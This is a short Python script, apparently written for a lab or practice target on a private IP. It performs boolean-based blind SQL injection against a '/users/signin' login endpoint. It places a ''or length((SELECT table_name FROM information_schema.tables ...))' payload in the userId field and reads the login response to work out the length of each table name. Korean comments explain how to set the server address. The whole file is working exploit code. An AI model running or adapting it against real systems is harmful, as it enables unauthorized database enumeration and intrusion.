import requests

result = 0
for i in range(0,5):
    for j in range(1,10):
        id = f"'or length((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' OFFSET {i} limit 1))={j}--"
        # 서버 주소와 포트에 맞게 수정
        url = 'http://192.168.64.1:1204/users/signin'
        data = {
            'userId': id,
            'password': 'hello1'
        }

        try:
            response = requests.post(url, json=data)
            if('success' in response.text):
                print(i+1,"번째 테이블 이름 길이: ",j)
                break

        except Exception as e:
            print('요청 중 오류 발생:', e)
